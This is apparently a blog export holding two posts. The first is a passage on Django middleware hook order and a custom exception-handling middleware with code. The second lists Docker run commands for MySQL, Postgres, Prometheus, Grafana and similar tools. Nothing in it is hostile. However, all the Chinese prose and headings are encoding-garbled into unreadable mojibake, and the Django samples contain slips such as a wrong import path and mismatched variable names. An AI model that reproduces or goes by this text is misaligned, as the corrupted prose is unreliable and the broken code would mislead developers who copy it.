<li>å¯¹äº<code>view</code>ä¸­å‡ºç°çš„å…¶ä»–å¼‚å¸¸ï¼Œ<code>Response</code>ä¼šè¿”å›<code>Unknown exception</code></li>
<li>å¼‚å¸¸ä¿¡æ¯(<code>message</code>)å®ç°äº†<code>i18n</code></li>
</ul>
<h1 id="Djangoä¸­å¯¹å¼‚å¸¸çš„å¤„ç†"><a href="#Djangoä¸­å¯¹å¼‚å¸¸çš„å¤„ç†" class="headerlink" title="Djangoä¸­å¯¹å¼‚å¸¸çš„å¤„ç†"></a>Djangoä¸­å¯¹å¼‚å¸¸çš„å¤„ç†</h1><h2 id="Djangoä¸­å¯¹requestçš„å¤„ç†"><a href="#Djangoä¸­å¯¹requestçš„å¤„ç†" class="headerlink" title="Djangoä¸­å¯¹requestçš„å¤„ç†"></a>Djangoä¸­å¯¹requestçš„å¤„ç†</h2><ul>
<li>é¦–å…ˆæ‰§è¡Œ<code>process_request</code>å‡½æ•°ï¼Œç„¶ååœ¨æ‰§è¡Œè§†å›¾å‡½æ•°ä¹‹å‰æ‰§è¡Œ<code>process_view</code>å‡½æ•°ï¼Œå†æ‰§è¡Œè§†å›¾å‡½æ•°ï¼Œæœ€åæ‰§è¡Œ<code>process_response</code>å‡½æ•°</li>
<li><code>process_request</code>åªè¿”å›<code>None</code>ï¼Œæ‰€æœ‰ä¸­é—´ä»¶çš„<code>process_request</code>æ‰§è¡Œå®Œä¹‹åï¼Œå°±åŒ¹é…è·¯ç”±ï¼Œæ‰¾åˆ°å¯¹åº”çš„è§†å›¾å‡½æ•°ï¼Œåœ¨æ‰§è¡Œè§†å›¾å‡½æ•°ä¹‹å‰å…ˆæ‰§è¡Œä¸­é—´ä»¶çš„ <code>process_view</code>å‡½æ•°</li>
<li>å¦‚æœ<code>process_view</code>è¿”å› Noneï¼Œå°±ç»§ç»­æ‰§è¡Œåç»­çš„ä¸­é—´ä»¶çš„<code>process_view</code>æ–¹æ³•ï¼Œæ‰§è¡Œå®Œæ‰€æœ‰çš„<code>process_view</code>å‡½æ•°ä¹‹åæ‰§è¡Œè§†å›¾å‡½æ•°</li>
<li>å¦‚æœå…¶ä¸­æœ‰ä¸ª process_view è¿”å›äº† HttpResponseï¼Œå°±ä¸æ‰§è¡Œåç»­çš„ process_view å‡½æ•°ï¼Œä¼šè·³åˆ°ç¬¬ä¸€ä¸ª process_response å‡½æ•°ï¼Œå¹¶ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</li>
</ul>
<p><img data-src="/../images/pasted-0.png" alt="Diangoä¸­ä¸­é—´ä»¶å¤„ç†è¿‡ç¨‹"></p>
<h2 id="ä¸­é—´ä»¶-ç±»-ä¸­5ç§æ–¹æ³•"><a href="#ä¸­é—´ä»¶-ç±»-ä¸­5ç§æ–¹æ³•" class="headerlink" title="ä¸­é—´ä»¶(ç±»)ä¸­5ç§æ–¹æ³•"></a>ä¸­é—´ä»¶(ç±»)ä¸­5ç§æ–¹æ³•</h2><p>ä¸­é—´ä»¶ä¸­å¯ä»¥å®šä¹‰5ä¸ªæ–¹æ³•:</p>
<ul>
<li>process_request(request)</li>
<li>process_view(request, view_func, view_args, view_kwargs)</li>
<li>process_exception(request, exception)</li>
<li>process_template_response(request, response)</li>
<li>process_response(request, response)</li>
</ul>
<h3 id="process-request"><a href="#process-request" class="headerlink" title="process_request"></a>process_request</h3><ol>
<li>ä¸­é—´ä»¶åœ¨æ”¶åˆ°<code>request</code>è¯·æ±‚ä¹‹åæ‰§è¡Œ</li>
<li>æŒ‰ç…§<code>settings.py</code>ä¸­<code>MIDDLEWARE_CLASSES</code>çš„é¡ºåºï¼Œé¡ºåºæ‰§è¡Œ</li>
<li>å¦‚æœè¯¥å‡½æ•°è¿”å›<code>None</code>ï¼Œç»§ç»­æ‰§è¡Œåé¢çš„ä¸­é—´ä»¶çš„<code>process_request</code>æ–¹æ³•</li>
<li>å¦‚æœè¯¥å‡½æ•°è¿”å›<code>HttpResponse</code>ï¼Œåˆ™ä¸å†ç»§ç»­æ‰§è¡Œåé¢çš„ä¸­é—´ä»¶çš„<code>process_request </code>æ–¹æ³•</li>
</ol>
<h3 id="process-view"><a href="#process-view" class="headerlink" title="process_view"></a>process_view</h3><ol>
<li>æ‰§è¡Œå®Œæ‰€æœ‰ä¸­é—´ä»¶çš„<code>process_request</code>æ–¹æ³•</li>
<li>åœ¨<code>urls.py</code>ä¸­æ‰¾åˆ°å¯¹åº”è§†å›¾å‡½æ•°</li>
<li>æ‹¿åˆ°è§†å›¾å‡½æ•°çš„åç§°ã€å‚æ•°ï¼Œåœ¨æ‰§è¡Œè§†å›¾å‡½æ•°ä¹‹å‰æ‰§è¡Œ</li>
<li>å¦‚æœè¿”å›<code>None</code>ï¼Œåˆ™ç»§ç»­æ‰§è¡Œåé¢çš„ä¸­é—´ä»¶çš„<code>process_view</code>å‡½æ•°ï¼Œç„¶åæ‰§è¡Œä¸‹æ˜‚åº”çš„è§†å›¾å‡½æ•°</li>
<li>å¦‚æœè¿”å›<code>HttpResponse</code>ï¼Œåˆ™ä¸æ‰§è¡Œåç»­çš„<code>process_view</code>å‡½æ•°ï¼Œä¹Ÿä¸æ‰§è¡Œè§†å›¾å‡½æ•°ï¼Œç„¶åæ‰§è¡Œæ‰€æœ‰çš„<code>response</code>ä¸­é—´ä»¶</li>
</ol>
<h3 id="process-exception"><a href="#process-exception" class="headerlink" title="process_exception"></a>process_exception</h3><ol>
<li>æ‰§è¡Œè§†å›¾å‡½æ•°çš„è¿‡ç¨‹ä¸­å¦‚æœå¼•å‘å¼‚å¸¸ï¼Œåˆ™æŒ‰ç…§<code>settings.py</code>ä¸­<code>MIDDLEWARE_CLASSES</code>çš„é¡ºåºï¼Œå€’åºæ‰§è¡Œ<code>process_exception</code>æ–¹æ³•</li>
<li>å¦‚æœè¿”å›<code>None</code>ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªä¸­é—´ä»¶çš„<code>process_exception</code>æ–¹æ³• </li>
<li>å¦‚æœè¿”å›<code>HttpReponse</code>å¯¹è±¡ï¼Œåˆ™è¯¥ä¸­é—´ä»¶ä¸Šæ–¹å…¶ä»–ä¸­é—´ä»¶çš„<code>process_exception</code>æ–¹æ³•ä¸ä¼šè¢«è°ƒç”¨</li>
<li>ä¸€æ—¦å…¶ä¸­æŸä¸ªä¸­é—´ä»¶æœ‰è¿”å›å€¼ï¼Œåˆ™è°ƒç”¨<code>template_response</code>å’Œ<code>response</code>ä¸­é—´ä»¶<br>,å¦åˆ™å¯åŠ¨<a href="https://docs.djangoproject.com/zh-hans/2.1/ref/views/#error-views">é»˜è®¤çš„å¼‚å¸¸å¤„ç†</a></li>
</ol>
<div class="note info">
            <p>æœ€ååŠå¥ä¸ªäººç†è§£:å¦‚æœå¦‚æœæ‰€æœ‰ä¸­é—´ä»¶çš„<code>process_exception</code>æ–¹æ³•éƒ½æ‰§å®Œåè¿˜æ²¡æœ‰è¿”å›å€¼ï¼Œåˆ™å¯åŠ¨é»˜è®¤çš„å¼‚å¸¸å¤„ç†</p>
          </div>

<h3 id="process-template-response"><a href="#process-template-response" class="headerlink" title="process_template_response"></a>process_template_response</h3><ol>
<li>åœ¨è§†å›¾å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åæ‰§è¡Œ</li>
<li><code>response</code>æ˜¯Djangoè§†å›¾æˆ–è€…æŸä¸€ä¸­é—´ä»¶çš„è¿”å›å€¼(<code>TemplateResponse</code>å¯¹è±¡æˆ–ç­‰ä»·)</li>
<li>åªæœ‰<code>response</code>å®ç°äº†<code>render</code>æ–¹æ³•æ‰ä¼šæ‰§è¡Œ</li>
<li>ä¸€æ—¦æ‰€æœ‰çš„ä¸­é—´ä»¶çš„<code>template_response</code>è¢«æ‰§è¡Œå®Œï¼Œåˆ™è°ƒç”¨<code>render</code>æ–¹æ³•</li>
<li>æŒ‰ç…§ä¸­é—´ä»¶çš„é¡ºåºï¼Œå€’åºæ‰§è¡Œ</li>
</ol>
<h3 id="process-response"><a href="#process-response" class="headerlink" title="process_response"></a>process_response</h3><ol>
<li>åœ¨è§†å›¾å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åæ‰§è¡Œ</li>
<li>å¿…é¡»æœ‰è¿”å›å€¼ï¼Œä¸”è¿”å›ç±»å‹å¿…é¡»æ˜¯<code>HttpResponse</code>å¯¹è±¡</li>
<li>æŒ‰ç…§ä¸­é—´ä»¶çš„é¡ºåºï¼Œå€’åºæ‰§è¡Œ</li>
</ol>
<h1 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h1><h2 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h2><ul>
<li>middleware.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"><span class="keyword">from</span> django.models <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.core.serializers.json <span class="keyword">import</span> DjangoJSONEncoder</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span>Â <span class="title class_">MyMiddleware</span>(<span class="title class_ inherited__">MiddlewareMixin</span>):</span><br><span class="line">Â Â Â Â <span class="keyword">def</span>Â <span class="title function_">process_exception</span>(<span class="params">self,Â request,Â exception</span>):</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â <span class="keyword">not</span>Â <span class="built_in">isinstance</span>(exception,Â BaseException):</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â settings.DEBUG:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â JsonResponse(&#123;<span class="string">&#x27;result&#x27;</span>:Â <span class="string">&#x27;&#x27;</span>,Â <span class="string">&#x27;msg&#x27;</span>:Â <span class="built_in">str</span>(exception),Â <span class="string">&#x27;status&#x27;</span>:Â <span class="number">1000</span>&#125;)</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">else</span>:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â JsonResponse(UnknownException().as_dict())</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">else</span>:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â JsonResponse(exception.as_dict())</span><br><span class="line"></span><br><span class="line">Â Â Â Â <span class="keyword">def</span>Â <span class="title function_">process_response</span>(<span class="params">self,Â request,Â response</span>):</span><br><span class="line">Â Â Â Â Â Â Â Â procese_typeÂ =Â (<span class="built_in">list</span>,Â <span class="built_in">tuple</span>,Â <span class="built_in">dict</span>,Â <span class="built_in">str</span>,Â <span class="built_in">int</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â <span class="built_in">isinstance</span>(response,Â models.Model):</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â responseÂ =Â <span class="built_in">str</span>(response)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â <span class="built_in">isinstance</span>(response,Â procese_type):</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â retÂ =Â &#123;<span class="string">&#x27;result&#x27;</span>:Â response,Â <span class="string">&#x27;msg&#x27;</span>:Â <span class="string">&#x27;success&#x27;</span>,Â <span class="string">&#x27;status&#x27;</span>:Â <span class="number">200</span>&#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â JsonResponse(ret,Â encoder=DjangoJSONEncoder)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></li>
<li>exceptions.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>Â abcÂ <span class="keyword">import</span>Â ABCMeta</span><br><span class="line"><span class="keyword">from</span>Â .messageÂ <span class="keyword">import</span>Â ErrorMsg</span><br><span class="line"><span class="keyword">class</span>Â <span class="title class_">InterFaceAsDictInterFace</span>:</span><br><span class="line">Â Â Â Â <span class="keyword">def</span>Â <span class="title function_">as_dict</span>(<span class="params">self</span>):</span><br><span class="line">Â Â Â Â Â Â Â Â retÂ =Â &#123;<span class="string">&#x27;result&#x27;</span>:Â <span class="string">&#x27;&#x27;</span>,Â <span class="string">&#x27;msg&#x27;</span>:Â <span class="built_in">getattr</span>(<span class="variable language_">self</span>,Â <span class="string">&#x27;__msg__&#x27;</span>,Â <span class="string">&#x27;&#x27;</span>),Â <span class="string">&#x27;status&#x27;</span>:Â <span class="built_in">getattr</span>(<span class="variable language_">self</span>,Â <span class="string">&#x27;__status__&#x27;</span>,Â <span class="string">&#x27;&#x27;</span>)&#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span>Â <span class="title class_">BaseException</span>(Exception,Â InterFaceAsDictInterFace):</span><br><span class="line">Â Â Â Â __metaclass__Â =Â ABCMeta</span><br><span class="line"></span><br><span class="line">Â Â Â Â <span class="keyword">def</span>Â <span class="title function_">__init__</span>(<span class="params">self,Â msg=<span class="literal">None</span></span>):</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="built_in">super</span>(BaseException,Â <span class="variable language_">self</span>).__init__()</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â msgÂ <span class="keyword">is</span>Â <span class="keyword">not</span>Â <span class="literal">None</span>:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable language_">self</span>.__msg__Â =Â msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnknownException</span>(<span class="title class_ inherited__">InterFaceAsDictInterFace</span>):</span><br><span class="line">	__status__ = <span class="number">1000</span></span><br><span class="line">	__msg__ = ErrorMsg.UNKNOWN_EXCEPTION</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span>(<span class="title class_ inherited__">BaseException</span>):</span><br><span class="line">	__status__=<span class="number">1001</span></span><br><span class="line">	__msg__=ErrorMsg.MY_EXCEPTION</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>message.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.translation <span class="keyword">import</span> gettext <span class="keyword">as</span> _</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorMsg</span>:</span><br><span class="line">	UNKNOWN_EXCEPTION= _(<span class="string">&#x27;Unknown exception.&#x27;</span>)</span><br><span class="line">	MY_EXCEPTION = _(<span class="string">&#x27;Test exception.&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="ä¿®æ”¹settingsæ–‡ä»¶"><a href="#ä¿®æ”¹settingsæ–‡ä»¶" class="headerlink" title="ä¿®æ”¹settingsæ–‡ä»¶"></a>ä¿®æ”¹settingsæ–‡ä»¶</h2><p>ä¿®æ”¹<code>setting</code>ä¸­çš„<code>MIDDLEWARE_CLASSES</code>å˜é‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    <span class="string">&#x27;django.middleware.security.SecurityMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;middleware.MyMiddleware&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h1><h2 id="å¯¹å‰ç«¯Postè¯·æ±‚è¿›è¡Œå‚æ•°æ ¡éªŒ"><a href="#å¯¹å‰ç«¯Postè¯·æ±‚è¿›è¡Œå‚æ•°æ ¡éªŒ" class="headerlink" title="å¯¹å‰ç«¯Postè¯·æ±‚è¿›è¡Œå‚æ•°æ ¡éªŒ"></a>å¯¹å‰ç«¯Postè¯·æ±‚è¿›è¡Œå‚æ•°æ ¡éªŒ</h2><p>ç›®å‰æƒ³å‡ºæ¥äº†ä¸¤ç§ç­–ç•¥(å‡è®¾<code>post_json</code>ä¸ºåºåˆ—åŒ–åçš„å­—å…¸):</p>
<ol>
<li>è§†å›¾å‡½æ•°ä¸­ä½¿ç”¨<code>get</code>ä»å­—å…¸ä¸­è·å–å‚æ•°ï¼Œåˆ¤æ–­<code>required</code>çš„å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œ<code>raise</code>è‡ªå®šä¹‰çš„å¼‚å¸¸ï¼Œå¦‚:<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exception.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValidationError</span>(<span class="title class_ inherited__">BaseException</span>):</span><br><span class="line">	__msg__ = ErrorMsg.INVALID_ARGUMENT</span><br><span class="line">	__status__ = <span class="number">1001</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># message.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorMsg</span>:</span><br><span class="line">	UNKNOWN_EXCEPTION= _(<span class="string">&#x27;Unknown exception.&#x27;</span>)</span><br><span class="line">	INVALID_ARGUMENT = _(<span class="string">&#x27;Invalid arguments.&#x27;</span>)</span><br><span class="line">	REQUIRED_ARGUMENT = _(<span class="string">&#x27;A &#123;0&#125; argument is required.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># view.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">	...</span><br><span class="line">	user_name = post_json.get(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># required</span></span><br><span class="line">	pass_word = post_json.get(<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># required</span></span><br><span class="line">	user_type = post_json.get(<span class="string">&#x27;user_type&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># not required</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">		<span class="keyword">raise</span> ValidationError(ErrorMsg.REQUIRED_ARGUMENT.<span class="built_in">format</span>(<span class="string">&#x27;username/passswordd&#x27;</span>))</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></li>
<li>è§†å›¾å‡½æ•°ä¸­å¯¹å‚æ•°ä¸åšæ ¡éªŒï¼Œåªéœ€åœ¨ä¸­é—´ä»¶æ·»åŠ ä¸€å¥ï¼Œå³å¯å¯¹è§†å›¾å‡½æ•°ä¸­<code>raise</code>çš„<code>KeyError</code>è¿›è¡Œç»Ÿä¸€å¤„ç†<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exception.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValidationError</span>(<span class="title class_ inherited__">BaseException</span>):</span><br><span class="line">	__msg__ = ErrorMsg.INVALID_ARGUMENT</span><br><span class="line">	__status__ = <span class="number">1001</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># middleware.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span>Â <span class="title function_">process_exception</span>(<span class="params">self,Â request,Â exception</span>):</span><br><span class="line">Â <span class="keyword">if</span>Â <span class="built_in">isinstance</span>(exception,Â KeyError):</span><br><span class="line">	exceptionÂ =Â ValidationError(ErrorMsg.REQUIRED_ARGUMENT.<span class="built_in">format</span>(exception))</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"><span class="comment"># message.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorMsg</span>:</span><br><span class="line">	UNKNOWN_EXCEPTION= _(<span class="string">&#x27;Unknown exception.&#x27;</span>)</span><br><span class="line">	INVALID_ARGUMENT = _(<span class="string">&#x27;Invalid arguments.&#x27;</span>)</span><br><span class="line">	REQUIRED_ARGUMENT = _(<span class="string">&#x27;A &#123;0&#125; argument is required.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># view.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">	...</span><br><span class="line">	user_name = post_json[<span class="string">&#x27;user_name&#x27;</span>] <span class="comment"># required</span></span><br><span class="line">	user_type = post_json.get(<span class="string">&#x27;user_type&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># not required</span></span><br><span class="line">	...</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="è§†å›¾å‡½æ•°è¿”å›"><a href="#è§†å›¾å‡½æ•°è¿”å›" class="headerlink" title="è§†å›¾å‡½æ•°è¿”å›"></a>è§†å›¾å‡½æ•°è¿”å›</h2><p>ç›®å‰è§†å›¾å‡½æ•°å¿…é¡»æœ‰è¿”å›å€¼ï¼Œä¸èƒ½ä¸º<code>None</code>ï¼Œè¿˜ä¸çŸ¥é“æ€ä¹ˆè§£å†³</p>
<h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ul>
<li><a href="https://docs.djangoproject.com/zh-hans/2.1/topics/http/middleware/">Django ä¸­é—´ä»¶å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://docs.djangoproject.com/zh-hans/2.2/topics/i18n/translation/">Django å›½é™…åŒ–å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://github.com/shaowenchen/django-exceptionbox">Githubé¡¹ç›®(django-exceptionbox)</a></li>
<li><a href="https://www.chenshaowen.com/blog/error-code-design-and-unified-processing-in-django.html#32-ExceptionBox">é”™è¯¯ç è®¾è®¡ä»¥åŠ Django çš„å¼‚å¸¸ç»Ÿä¸€å¤„ç†</a></li>
<li><a href="https://www.cnblogs.com/huchong/p/7819296.html">Django----ä¸­é—´ä»¶è¯¦è§£</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>API</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨Dockerå®¹å™¨å¯åŠ¨å‘½ä»¤</title>
    <url>/posts/docker/</url>
    <content><![CDATA[<h1 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h1><h2 id="å…³ç³»å‹æ•°æ®åº“"><a href="#å…³ç³»å‹æ•°æ®åº“" class="headerlink" title="å…³ç³»å‹æ•°æ®åº“"></a>å…³ç³»å‹æ•°æ®åº“</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run  -p 3306:3306 --name mysql \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/mysql&quot;</span>:/var/lib/mysql \</span><br><span class="line">    -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</span><br></pre></td></tr></table></figure>

<h3 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run  --name postgres \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/postgres&quot;</span>:/var/lib/postgresql/data \</span><br><span class="line">    -e POSTGRES_PASSWORD=123456 \</span><br><span class="line">    -p 5432:5432 -d postgres</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="PgAdmin"><a href="#PgAdmin" class="headerlink" title="PgAdmin"></a>PgAdmin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -p 8080:80  --name=pgadmin  \</span><br><span class="line">    -e <span class="string">&quot;PGADMIN_DEFAULT_EMAIL=admin@zhaoqi.vip&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;PGADMIN_DEFAULT_PASSWORD=123456&quot;</span>  -d dpage/pgadmin4</span><br></pre></td></tr></table></figure>

<h2 id="æ—¶åºæ•°æ®åº“"><a href="#æ—¶åºæ•°æ®åº“" class="headerlink" title="æ—¶åºæ•°æ®åº“"></a>æ—¶åºæ•°æ®åº“</h2><h3 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name=prometheus -p 9090:9090 \</span><br><span class="line">    -v <span class="variable">$PWD</span>/prometheus:/etc/prometheus \</span><br><span class="line">    -v <span class="variable">$PWD</span>/prometheus/data:/prometheus \</span><br><span class="line">    prom/prometheus \</span><br><span class="line">    --storage.tsdb.retention.time=10y \</span><br><span class="line">    --config.file=/etc/prometheus/prometheus.yml</span><br></pre></td></tr></table></figure>

<h3 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8086:8086 --name influxdb  \</span><br><span class="line">    -v <span class="variable">$PWD</span>/influxdb:/var/lib/influxdb  influxdb</span><br></pre></td></tr></table></figure>

<h3 id="OpenTSDB"><a href="#OpenTSDB" class="headerlink" title="OpenTSDB"></a>OpenTSDB</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name opentsdb -dp 4242:4242 petergrace/opentsdb-docker</span><br></pre></td></tr></table></figure>

<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 27017:27017 --name mongodb \</span><br><span class="line">    -e MONGO_INITDB_ROOT_USERNAME=&lt;USERNAME&gt; \ </span><br><span class="line">    -e MONGO_INITDB_ROOT_PASSWORD=&lt;PASSWORD&gt; \ </span><br><span class="line">    -v <span class="variable">$PWD</span>/mongodb:/data/db \</span><br><span class="line">    mongo:latest</span><br></pre></td></tr></table></figure>

<h3 id="MongoDB-express"><a href="#MongoDB-express" class="headerlink" title="MongoDB express"></a>MongoDB express</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8081:8081 --name mongo-express-test \</span><br><span class="line">    -e ME_CONFIG_MONGODB_URL=mongodb://mongodb:27017/local \</span><br><span class="line">    -e ME_CONFIG_MONGODB_ENABLE_ADMIN=<span class="literal">true</span> \</span><br><span class="line">    -e ME_CONFIG_BASICAUTH_USERNAME=admin \</span><br><span class="line">    -e ME_CONFIG_BASICAUTH_PASSWORD=pass \</span><br><span class="line">    -e ME_CONFIG_BASICAUTH_ENABLED=<span class="literal">true</span> \</span><br><span class="line">    mongo-express:latest</span><br></pre></td></tr></table></figure>

<h1 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h1><h2 id="ç›‘æ§"><a href="#ç›‘æ§" class="headerlink" title="ç›‘æ§"></a>ç›‘æ§</h2><h3 id="Cadvisor"><a href="#Cadvisor" class="headerlink" title="Cadvisor"></a>Cadvisor</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --volume=/:/rootfs:ro \</span><br><span class="line">    --volume=/var/run:/var/run:ro \</span><br><span class="line">    --volume=/sys:/sys:ro \</span><br><span class="line">    --volume=/var/lib/docker/:/var/lib/docker:ro \</span><br><span class="line">    --volume=/dev/disk/:/dev/disk:ro \</span><br><span class="line">    --publish=8080:8080  --detach=<span class="literal">true</span>  --name=cadvisor \</span><br><span class="line">    google/cadvisor:latest</span><br></pre></td></tr></table></figure>

<h3 id="node-exporter"><a href="#node-exporter" class="headerlink" title="node_exporter"></a>node_exporter</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  -p 9100:9100 \</span><br><span class="line">  --name node-exporter \</span><br><span class="line">  --pid=<span class="string">&quot;host&quot;</span> \</span><br><span class="line">  -v <span class="string">&quot;/:/host:ro,rslave&quot;</span> \</span><br><span class="line">  prom/node-exporter:latest \</span><br><span class="line">  --path.rootfs=/host</span><br></pre></td></tr></table></figure>

<h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3000:3000 --name grafana \</span><br><span class="line">    -v <span class="variable">$PWD</span>/grafana:/var/lib/grafana \</span><br><span class="line">    -v <span class="variable">$PWD</span>/grafana/etc:/etc/grafana grafana/grafana</span><br></pre></td></tr></table></figure>

